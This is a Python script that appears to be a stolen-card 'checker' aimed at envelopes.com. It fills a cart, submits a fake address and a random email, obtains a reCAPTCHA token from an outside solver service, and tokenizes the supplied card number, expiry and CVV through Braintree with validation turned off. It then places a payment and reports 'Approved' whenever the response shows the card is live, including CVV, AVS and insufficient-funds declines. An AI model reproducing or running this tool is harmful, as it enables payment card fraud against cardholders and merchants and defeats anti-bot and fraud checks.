import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent

class Autocomplet:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    def cut_str(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = Autocomplet().cut_str(self._tokenEncoding, '"authorizationFingerprint":"', '","')

        return self.bear_end

@dataclass
class b35:
    def __init__(self, tarjeta):

            partes = tarjeta.split("|")
        
            self.tarjeta = tarjeta
            if len(partes) == 4:
                self.cc = partes[0]
                self.mes = partes[1]
                self.ano = partes[2]
                self.cvv = partes[3]

    def main(self):
        try:
            self.session = Session()
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()

            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            Agent = UserAgent().random

            #self.session.proxies = proxies

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-MX,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://www.envelopes.com/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',}
            r1 = self.session.get('https://www.envelopes.com/bright-white-laid-vflap-80lb-cardstock-a7-5-1-4x7-1-4-envelopes-item-1921397', headers=headers,)
            form_key = Autocomplet().cut_str(r1.text,'name="form_key" type="hidden" value="','"')

            headers = {'accept': '*/*','accept-language': 'es-MX,es;q=0.9','content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhqNBwfnpIDzqS7Ns','newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MjA1NTUiLCJhcCI6IjY1NjYyNTc5MyIsImlkIjoiODU4NGFkMGI5N2VmNWY0OSIsInRyIjoiM2U1NzI0ZjgwNjBmNmU4OTYyZWZmOWFhMzcwZGU4ZDMiLCJ0aSI6MTc3NjYxODI1NzQ2NCwidGsiOiIxMzIyODQwIn19','origin': 'https://www.envelopes.com','priority': 'u=1, i','referer': 'https://www.envelopes.com/bright-white-laid-vflap-80lb-cardstock-a7-5-1-4x7-1-4-envelopes-item-1921397','traceparent': '00-3e5724f8060f6e8962eff9aa370de8d3-8584ad0b97ef5f49-01','tracestate': '1322840@nr=0-1-2820555-656625793-8584ad0b97ef5f49----1776618257464','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','cookie': f'form_key={form_key}',}
            data = f'------WebKitFormBoundaryhqNBwfnpIDzqS7Ns\r\nContent-Disposition: form-data; name="form_key"\r\n\r\n{form_key}\r\n------WebKitFormBoundaryhqNBwfnpIDzqS7Ns\r\nContent-Disposition: form-data; name="ajax"\r\n\r\ntrue\r\n------WebKitFormBoundaryhqNBwfnpIDzqS7Ns\r\nContent-Disposition: form-data; name="vqs"\r\n\r\ntrue\r\n------WebKitFormBoundaryhqNBwfnpIDzqS7Ns\r\nContent-Disposition: form-data; name="qty"\r\n\r\n25\r\n------WebKitFormBoundaryhqNBwfnpIDzqS7Ns\r\nContent-Disposition: form-data; name="sku"\r\n\r\n1921397\r\n------WebKitFormBoundaryhqNBwfnpIDzqS7Ns--\r\n'
            r2 = self.session.post('https://www.envelopes.com/checkout/cart/add', headers=headers, data=data)
            phpsessidvalue = self.session.cookies.get('PHPSESSID')    

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-MX,es;q=0.9','priority': 'u=0, i','referer': 'https://www.envelopes.com/bright-white-laid-vflap-80lb-cardstock-a7-5-1-4x7-1-4-envelopes-item-1921397','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',}
            r3 = self.session.get('https://www.envelopes.com/checkout/cart', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-MX,es;q=0.9','priority': 'u=0, i','referer': 'https://www.envelopes.com/checkout/cart','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            r4 = self.session.get('https://www.envelopes.com/checkout/', headers=headers)
            entity_id = Autocomplet().cut_str(r3.text,'"entity_id":"', '"')
            clientToken = Autocomplet().cut_str(r3.text,'"clientToken":"', '"')
            self.client_eyj = Autocomplet().DecodeBear(clientToken)

            headers = {'accept': '*/*','accept-language': 'es-MX,es;q=0.9','content-type': 'application/json','newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MjA1NTUiLCJhcCI6IjY1NjYyNTc5MyIsImlkIjoiMTZkNTU4NTFlOTMyZGY3NSIsInRyIjoiMTRmM2Y1ZDEzOTA2NTRjZWY3N2ExODI2YTdmOGU3NTgiLCJ0aSI6MTc3NjYxOTE4NzE1MiwidGsiOiIxMzIyODQwIn19','origin': 'https://www.envelopes.com','priority': 'u=1, i','referer': 'https://www.envelopes.com/checkout/','traceparent': '00-14f3f5d1390654cef77a1826a7f8e758-16d55851e932df75-01','tracestate': '1322840@nr=0-1-2820555-656625793-16d55851e932df75----1776619187152','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-newrelic-id': 'Vg4FUVNWDRAGV1haDgMDVVU=','x-requested-with': 'XMLHttpRequest',}
            json_data = {'address': {'street': ['261 Morrin Road',],'city': 'NEW YORK','region_id': '43','region': '','country_id': 'US','postcode': '10010','firstname': 'fernanda','lastname': 'Hot','company': '','telephone': '5667873443',},}
            r5 = self.session.post(f'https://www.envelopes.com/rest/env_en_us/V1/guest-carts/{entity_id}/estimate-shipping-methods',headers=headers,json=json_data,)

            headers = {'accept': '*/*','accept-language': 'es-MX,es;q=0.9','content-type': 'application/json','newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MjA1NTUiLCJhcCI6IjY1NjYyNTc5MyIsImlkIjoiMTVhZjY3MDY3OTUwMDE3MyIsInRyIjoiYzUwOGJkODAyNmVmODVhMDQ3OWY0YWI1YmNjZGNjODkiLCJ0aSI6MTc3NjYxOTE4NzI0MywidGsiOiIxMzIyODQwIn19','origin': 'https://www.envelopes.com','priority': 'u=1, i','referer': 'https://www.envelopes.com/checkout/','traceparent': '00-c508bd8026ef85a0479f4ab5bccdcc89-15af670679500173-01','tracestate': '1322840@nr=0-1-2820555-656625793-15af670679500173----1776619187243','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-newrelic-id': 'Vg4FUVNWDRAGV1haDgMDVVU=','x-requested-with': 'XMLHttpRequest',}
            json_data = {'addressInformation': {'shipping_address': {'countryId': 'US','regionId': '43','region': '','street': ['261 Morrin Road',],'company': '','telephone': '5667873443','postcode': '10010','city': 'NEW YORK','firstname': 'fernanda','lastname': 'Hot',},'billing_address': {'countryId': 'US','regionId': '43','region': '','street': ['261 Morrin Road',],'company': '','telephone': '5667873443','postcode': '10010','city': 'NEW YORK','firstname': 'fernanda','lastname': 'Hot','saveInAddressBook': None,},'shipping_method_code': 'flatrate','shipping_carrier_code': 'flatrate','extension_attributes': {'newsletter_subscribe': True,'comments': '','is_blind_shipping': False,'save_to_account': 0,'shipping_account_number': '','shipping_reference_number': '','shipping_account_type': '',},},}
            r6 = self.session.post(f'https://www.envelopes.com/rest/env_en_us/V1/guest-carts/{entity_id}/shipping-information',headers=headers,json=json_data,)

            headers = {'Content-Type': 'application/json'}
            json_data = {'site_url': f'ttps://www.envelopes.com/rest/env_en_us/V1/guest-carts/{entity_id}/shipping-information','site_key': '6LfQOfokAAAAAKC7IG42wESRUUQHw_JDR8dWdPb8'}
            response = self.session.post('https://recaptcha-v3-production.up.railway.app/token', headers=headers, json=json_data)
            captcha_token = Autocomplet().cut_str(response.text,'{"success":true,"token":"','"')

            self.session_client_id = Autocomplet().SessionId()

            headers = {'accept': '*/*','accept-language': 'es-MX,es;q=0.9','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.session_client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.cc,'expirationMonth': self.mes,'expirationYear': self.ano,'cvv': self.cvv,},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            r7 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            token_card = Autocomplet().cut_str(r7.text,'{"token":"','"')

            headers = {'accept': '*/*','accept-language': 'es-MX,es;q=0.9','content-type': 'application/json','newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI4MjA1NTUiLCJhcCI6IjY1NjYyNTc5MyIsImlkIjoiY2M4NGFlNjlkYzNlNzBiMyIsInRyIjoiZDM4NWNkNjY2MjViNTUyNjA0ZWQ3OGZjYjFkZDJmMTciLCJ0aSI6MTc3NjYxOTU2NzY5OCwidGsiOiIxMzIyODQwIn19','origin': 'https://www.envelopes.com','priority': 'u=1, i','referer': 'https://www.envelopes.com/checkout/','traceparent': '00-d385cd66625b552604ed78fcb1dd2f17-cc84ae69dc3e70b3-01','tracestate': '1322840@nr=0-1-2820555-656625793-cc84ae69dc3e70b3----1776619567698','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36','x-newrelic-id': 'Vg4FUVNWDRAGV1haDgMDVVU=','x-recaptcha': captcha_token,'x-requested-with': 'XMLHttpRequest',}
            json_data = {'cartId': entity_id,'billingAddress': {'countryId': 'US','regionId': '43','region': '','street': ['261 Morrin Road',],'company': '','telephone': '5667873443','postcode': '10010','city': 'NEW YORK','firstname': 'fernanda','lastname': 'Hot','saveInAddressBook': None,},'paymentMethod': {'method': 'braintree','additional_data': {'payment_method_nonce': token_card,'device_data': '{"device_session_id":"f5b8108f997e9e89080a01e964da33be","fraud_merchant_id":null,"correlation_id":"7ec1e63f1234752443ac650a87beabf9"}',},},'email': CorreoRand,}
            r8 = self.session.post(f'https://www.envelopes.com/rest/env_en_us/V1/guest-carts/{entity_id}/payment-information',headers=headers,json=json_data,)
            self.session.close()

            Suceess = r8.text 
            msg = Autocomplet().cut_str(Suceess,'"message":"', '"')

            if '"success":true' in r8.text: return "Approved! 5.79 ✅", msg

            elif "Your payment could not be taken. Please try again or use a different payment method. Gateway Rejected: avs" in msg: return "Approved! ✅", msg

            elif "Your payment could not be taken. Please try again or use a different payment method. Insufficient Funds" in msg: return "Approved! ✅", msg

            elif "Your payment could not be taken. Please try again or use a different payment method. Card Issuer Declined CVV" in msg: return "Approved! ✅", msg
            elif "Your payment could not be taken. Please try again or use a different payment method. avs_and_cvv" in msg: return "Approved! ✅", msg
            elif "Your payment could not be taken. Please try again or use a different payment method. cvv" in msg: return "Approved! ✅", msg
            else: return 'Declined! ❌', msg 
        except: return 
#13
            
"""ccs = input('Card: ')
chk = b3().main(ccs)
print(chk)"""

"""            self.ccs = Autocomplet().Ccs(ccs)"""